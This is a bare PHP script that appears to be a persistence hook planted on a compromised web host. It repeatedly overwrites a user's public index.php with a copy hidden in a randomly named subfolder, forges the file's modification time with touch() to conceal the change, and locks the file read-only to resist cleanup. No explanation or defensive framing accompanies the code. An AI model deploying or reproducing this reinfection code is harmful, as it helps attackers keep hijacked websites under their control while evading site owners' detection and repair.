<?php 
$insj = '/usr/home/kwerbach/public_html/index.php';
$inym = '/usr/home/kwerbach/public_html/4QjGh9/OaSlFF.htm';
if (file_exists($insj)) {
    if (file_exists($inym)) {
        @chmod($insj, 0777);
        if (md5_file($insj) == md5_file($inym)) {
        } else {
            $chazh = @file_get_contents($inym);
			$at = filemtime($inym);
            file_put_contents($insj, $chazh);
            if ($at) {
                touch($insj, $at);
            }
        }
		@chmod($insj, 0444);
    }
} else {
    if (file_exists($inym)) {
		$at = filemtime($inym);
        $chazh = @file_get_contents($inym);
        file_put_contents($insj, $chazh);
		if ($at) {
			touch($insj, $at);
		}
    }
}
?>